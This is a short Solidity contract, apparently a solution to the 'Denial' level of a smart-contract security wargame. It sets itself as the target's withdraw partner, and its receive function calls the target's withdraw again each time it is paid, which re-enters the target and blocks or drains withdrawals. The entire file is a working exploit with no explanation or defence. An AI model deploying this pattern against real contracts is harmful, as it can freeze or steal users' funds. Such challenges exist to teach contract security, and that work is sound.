// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./20-denial.sol";
import "interfaces/idenial.sol";

contract Attack20 {
    IDenial target;

    constructor(address _targetAddress) {
        target = IDenial(_targetAddress);
        // become the withdraw partner 
        (bool _result, ) = address(target).call(
            abi.encodeWithSignature(("setWithdrawPartner(address)"), address(this))
        );
    }
    
    function attack() public {
        target.withdraw();
    }

    receive() external payable{
        this.attack();
    }
    
}